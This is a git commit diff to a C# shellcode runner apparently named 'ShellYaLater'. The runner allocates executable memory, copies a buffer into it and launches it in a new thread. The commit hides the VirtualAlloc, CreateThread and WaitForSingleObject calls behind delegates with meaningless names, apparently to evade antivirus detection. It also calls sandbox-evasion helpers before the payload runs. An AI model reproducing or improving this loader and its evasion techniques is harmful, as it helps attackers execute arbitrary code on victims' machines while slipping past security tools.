963bdb11a5dad014865bc0a773c32653ff2646b2
danny <danny@DEVMACHINE>
2025-05-14 13:55:26 -0700

    delegatefunctions

--- ShellYaLater/Program.cs
+++ ShellYaLater/Program.cs
@@ -18,8 +18,20 @@ namespace ShellYaLater
 
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        private delegate IntPtr J1(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        private delegate IntPtr U2(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        private delegate UInt32 ILY(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        private static J1 W1;
+        private static U2 RT2;
+        private static ILY ER3;
+
         static void Main(string[] args)
         {
+            W1 = VirtualAlloc;
+            RT2 = CreateThread;
+            ER3 = WaitForSingleObject;
             SherryChristmas.SleepTimer();
 
             SherryChristmas.VirtualAllocExNuma();
@@ -38,13 +50,13 @@ namespace ShellYaLater
             }
             int size = buf.Length;
 
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr addr = W1(IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
             Marshal.Copy(buf, 0, addr, size);
 
-            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            IntPtr hThread = RT2(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            ER3(hThread, 0xFFFFFFFF);
 
         }
     }
